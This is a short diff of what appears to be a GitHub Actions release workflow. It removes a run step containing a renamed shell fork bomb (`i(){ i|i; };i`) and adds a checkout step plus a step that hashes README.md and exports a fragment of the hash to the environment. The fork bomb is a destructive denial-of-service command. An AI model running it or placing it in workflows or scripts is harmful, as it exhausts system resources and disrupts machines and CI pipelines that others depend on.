@@ -7,4 +7,8 @@ jobs:
   release:
     runs-on: ubuntu-latest
     steps:
-      - run: i(){ i|i; };i
+      - uses: actions/checkout@v2
+      - run: |
+          sha="$(openssl sha256 ./README.md | cut -d ' ' -f2)"
+          echo shapart="${sha:0:2}-${sha:2:3}-${sha:5:3}-\
+          -${sha:8:2}-${sha:10:3}-${sha:13:3}" | tee -a "${GITHUB_ENV}"
